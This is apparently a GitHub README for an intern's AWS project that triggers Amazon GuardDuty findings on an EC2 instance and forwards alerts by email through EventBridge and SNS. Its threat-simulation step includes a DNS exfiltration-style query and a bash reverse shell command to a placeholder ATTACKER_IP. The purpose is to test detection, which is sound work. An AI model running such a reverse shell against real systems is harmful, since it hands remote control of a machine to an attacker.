```markdown
# AWS GuardDuty Threat Detection Project

## Project Overview

This project demonstrates how to simulate and detect suspicious behavior on an EC2 instance using **Amazon GuardDuty**, and send real-time alerts to an email via **SNS (Simple Notification Service)**.

You will:
- Deploy an EC2 instance with simulated vulnerabilities
- Enable GuardDuty for threat detection
- Trigger test findings and real behavior (DNS exfiltration, reverse shell)
- Use EventBridge to forward GuardDuty alerts to SNS
- Receive alerts via email

---

## Architecture

```

\[EC2 Instance]
|
Simulated Threat
↓
\[GuardDuty]
↓
\[Amazon EventBridge Rule]
↓
\[Amazon SNS Topic]
↓
\[Email Notification]

````


## Steps to Deploy

### 1. Launch EC2 Instance
- AMI: Amazon Linux 2 or 2023
- Instance Type: t2.micro
- Enable SSH and optionally HTTP/HTTPS in the Security Group
- Add this User Data (for Java setup):
```bash
#!/bin/bash
dnf install -y java-17-amazon-corretto
````

### 2. Simulate Threats on EC2

SSH into the instance and run:

```bash
# Simulate DNS exfiltration
dig $(uuidgen).yourdomain.com

# Simulate reverse shell (for test only)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

---

### 3. Enable GuardDuty

* Go to **Amazon GuardDuty** > Enable
* GuardDuty will begin monitoring for suspicious behavior

---

### 4. Create an SNS Topic

* Name: `GuardDutyAlerts`
* Subscribe your email (Confirm via email)

---

### 5. Setup EventBridge Rule

* Service: `aws.guardduty`
* Event type: `GuardDuty Finding`
* Target: SNS Topic `GuardDutyAlerts`

---

### 6. Generate Sample Findings (Optional)

```bash
aws guardduty list-detectors
aws guardduty create-sample-findings --detector-id <detector-id>
```

---

## Example Alert Email

You’ll receive an email like this when a finding occurs:

```json
{
  "source": "aws.guardduty",
  "detail-type": "GuardDuty Finding",
  "detail": {
    "type": "Recon:EC2/PortScan",
    "severity": 5,
    "resource": {
      "instanceDetails": {
        "instanceId": "i-xxxxxx"
      }
    }
  }
}
```

---

## Learnings

* GuardDuty detects behavior, not vulnerabilities
* SNS + EventBridge is ideal for automated alerting
* Simulated attacks help test detection pipelines safely


## Security Note

> All simulations were conducted in a secure, isolated AWS environment with no real malware or external C2 communication. Never use real attacks in production accounts.

---

## References

* [AWS GuardDuty Documentation](https://docs.aws.amazon.com/guardduty/)
* [AWS SNS](https://docs.aws.amazon.com/sns/)
* [AWS CLI Guide](https://docs.aws.amazon.com/cli/)

---

## Author

**Md Khiruzzaman**

Cloud Engineering Intern

GitHub: [mkovy39](https://github.com/mkovy39)

```
